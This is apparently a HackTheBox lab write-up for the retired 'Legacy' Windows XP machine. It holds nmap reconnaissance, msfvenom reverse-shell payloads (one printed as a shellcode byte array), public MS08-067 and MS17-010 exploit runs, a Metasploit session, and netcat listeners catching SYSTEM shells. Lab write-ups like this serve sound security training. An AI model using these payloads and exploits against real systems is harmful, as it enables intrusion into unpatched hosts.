---
title: "HackTheBox — Legacy Writeup"
date: 2020-09-02 12:06:00 +0530
categories: [HackTheBox,Windows Machines]
tags: [masscan, legacy, XP, SMB, ms08-67, ms17-010, shellcode, whoami, smbserver, metasploit, ms08_067_netapi]
image: /assets/img/Posts/Legacy.png
---

> Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 & MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.

>We will use three different methods to pwn this box. First, we will use MS08-067 exploit, then MS17-010 exploit and last we will use Metasploit for automatic exploitation.

## Reconnaissance

Lets start out with `masscan` and `Nmap` to find out open ports and services:

```shell
cfx:  ~/Documents/htb
→ masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.4

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-01 11:05:17 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4

cfx:  ~/Documents/htb
→ nmap -sC -sV -p 139,445 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 16:49 IST
Nmap scan report for 10.10.10.4
Host is up (0.21s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h28m48s, deviation: 2h07m16s, median: -5h58m48s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f8:10 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-09-01T11:20:40+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.95 seconds
```

We discovered SMB ports `139 & 445` are open and operating system running on the host is `Windows XP`.

### Nmap SMB script

Since `SMB` has been exploited widely in the past, let's run `nmap` script to check for SMB vulnerabilities.

```shell
cfx:  ~/Documents/htb
→ nmap --script smb-vuln* -p 139,445 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 16:51 IST
Nmap scan report for 10.10.10.4
Host is up (0.21s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
```

We discovered the host is vulnerable to notorious `MS08`-67 (exploited widely by Conficker worm)` and `MS17-010 (by Shadow Brokers)` SMB exploits.

We'll exploit both vulnerabilities **MS08-67** & **MS17-010** manually sticking to OSCP pattern using publicly available exploit scripts.

## MS08-67

There are multiple MS08-67 exploits available on the internet but the one which worked the best for me is from **Jivoi** available [**here**](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

To make this python script work we just have to replace the default given `shellcode` with our own. Shellcode generation command via `msfvenom` for different payload style is already given in comments by the author inside the script.

### Generating Shellcode

```shell
cfx:  ~/Documents/htb
→ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows                                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=55, char=0x78)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] =
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xeb\xc1\x4c\x8f\x83\xee\xfc\xe2\xf4\x17\x29\xce\x8f\xeb\xc1"
"\x2c\x06\x0e\xf0\x8c\xeb\x60\x91\x7c\x04\xb9\xcd\xc7\xdd\xff"
"\x4a\x3e\xa7\xe4\x76\x06\xa9\xda\x3e\xe0\xb3\x8a\xbd\x4e\xa3"
"\xcb\x00\x83\x82\xea\x06\xae\x7d\xb9\x96\xc7\xdd\xfb\x4a\x06"
"\xb3\x60\x8d\x5d\xf7\x08\x89\x4d\x5e\xba\x4a\x15\xaf\xea\x12"
"\xc7\xc6\xf3\x22\x76\xc6\x60\xf5\xc7\x8e\x3d\xf0\xb3\x23\x2a"
"\x0e\x41\x8e\x2c\xf9\xac\xfa\x1d\xc2\x31\x77\xd0\xbc\x68\xfa"
"\x0f\x99\xc7\xd7\xcf\xc0\x9f\xe9\x60\xcd\x07\x04\xb3\xdd\x4d"
"\x5c\x60\xc5\xc7\x8e\x3b\x48\x08\xab\xcf\x9a\x17\xee\xb2\x9b"
"\x1d\x70\x0b\x9e\x13\xd5\x60\xd3\xa7\x02\xb6\xa9\x7f\xbd\xeb"
"\xc1\x24\xf8\x98\xf3\x13\xdb\x83\x8d\x3b\xa9\xec\x3e\x99\x37"
"\x7b\xc0\x4c\x8f\xc2\x05\x18\xdf\x83\xe8\xcc\xe4\xeb\x3e\x99"
"\xdf\xbb\x91\x1c\xcf\xbb\x81\x1c\xe7\x01\xce\x93\x6f\x14\x14"
"\xdb\xe5\xee\xa9\x46\x85\xe5\xcf\x24\x8d\xeb\xc0\xf7\x06\x0d"
"\xab\x5c\xd9\xbc\xa9\xd5\x2a\x9f\xa0\xb3\x5a\x6e\x01\x38\x83"
"\x14\x8f\x44\xfa\x07\xa9\xbc\x3a\x49\x97\xb3\x5a\x83\xa2\x21"
"\xeb\xeb\x48\xaf\xd8\xbc\x96\x7d\x79\x81\xd3\x15\xd9\x09\x3c"
"\x2a\x48\xaf\xe5\x70\x8e\xea\x4c\x08\xab\xfb\x07\x4c\xcb\xbf"
"\x91\x1a\xd9\xbd\x87\x1a\xc1\xbd\x97\x1f\xd9\x83\xb8\x80\xb0"
"\x6d\x3e\x99\x06\x0b\x8f\x1a\xc9\x14\xf1\x24\x87\x6c\xdc\x2c"
"\x70\x3e\x7a\xac\x92\xc1\xcb\x24\x29\x7e\x7c\xd1\x70\x3e\xfd"
"\x4a\xf3\xe1\x41\xb7\x6f\x9e\xc4\xf7\xc8\xf8\xb3\x23\xe5\xeb"
"\x92\xb3\x5a";
```

We can replace the default shellcode given in the script with above one generated for my IP and port.

Looking at the usage of this exploit on line 228 we can see the exploit requires us to know the OS version and Language pack:

```console
          print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
          print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
          print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
          print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
          print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
          print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
          print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
          print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
```
Based on our Nmap results we know the host is running Windows XP and taking a wild guess we can try the exploit with option 6 for `Windows XP SP3 English (NX)`

### Exploitation

Lets start the `nc` listener on port 443 and execute the exploit:

```shell
cfx:  ~/Documents/htb/legacy
→ /usr/bin/python2 /root/Documents/htb/legacy/ms08-067.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

As the exploit finishes we get a call back on our listener:

```shell
cfx:  ~/Documents/htb/legacy
→ nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1028.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de*****************f

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0*****************3
```

The fact that we could grab both the flag indicates that we are running as `NT AUTHORITY\SYSTEM`, but how do we confirm whether we are system since Windows XP doesn't have `whoami` binary.

We can host `whoami.exe` which is by default available on kali OS inside `/usr/share/windows-binaries` on our SMB server using `Impacket's Smbserver` and run the binary on the remote host:

### Sharing the SMB folder from attacking machine:

```shell
cfx:  /usr/share/windows-binaries
→ smbserver.py cfx `pwd`
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.4,1039)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::4141414141414141
```

#### Executing `Whomai.exe` binary on target machine:

```shell
C:\WINDOWS\system32>\\10.10.14.14\cfx\whoami.exe
\\10.10.14.14\cfx\whoami.exe
NT AUTHORITY\SYSTEM
```

Hereby we confirm `MS08-67 exploit` gave us the shell as `NT AUTHORITY\SYSTEM`


## MS17-010

For MS17-010 exploit, we will use the [**code**](https://github.com/helviojunior/MS17-010) from **helviojunior** which is fork from **worawit/MS17-010** repo.

We can download the exploit using the following command:

```shell
wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
```
This exploit is pretty straight forward as it requires an reverse shell payload file which it uploads & executes on the target machine.

### Generating payload with MSFvenom:

```shell
cfx:  ~/Documents/htb/legacy/MS17-010
→ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o cfx.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: cfx.exe
```

### Exploitation

We will start a `nc` listener on port 443 and execute the exploit:

```shell
cfx:  ~/Documents/htb/legacy/MS17-010
→ /usr/bin/python2 send_and_execute.py 10.10.10.4 cfx.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x821c8770
SESSION: 0xe19ff010
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe19459f0
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1945a90
overwriting token UserAndGroups
Sending file QCNNC5.exe...
Opening SVCManager on 10.10.10.4.....
Creating service JPzI.....
Starting service JPzI.....
The NETBIOS connection with the remote host timed out.
Removing service JPzI.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

And as soon as the exploit completes we get a call back on our listener, we can use the same SMB hosted `whomai.exe` binary to confirm we are running as system:

```shell
cfx:  ~/Documents/htb/legacy/MS17-010
→ nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1031.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>\\10.10.14.14\cfx\whoami.exe
\\10.10.14.14\cfx\whoami.exe
NT AUTHORITY\SYSTEM
```

## Metasploit

Lets run Metasploit using `msfconsole` and use `exploit/windows/smb/ms08_067_netapi`, set the payload and other parameters and fire up the exploit.

Similar to above two methods, we can verify if we running as system using our `whoami.exe` binary.

```shell
cfx:  ~/Documents/htb/legacy/MS17-010
→ msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again

msf5 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.14:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.4:1035) at 2020-09-01 17:53:19 +0530

meterpreter > shell
Process 1344 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.


C:\WINDOWS\system32>\\10.10.14.14\cfx\whoami.exe
\\10.10.14.14\cfx\whoami.exe
NT AUTHORITY\SYSTEM
```
We pwned the Box !

Thanks for reading, Feedback is appreciated !
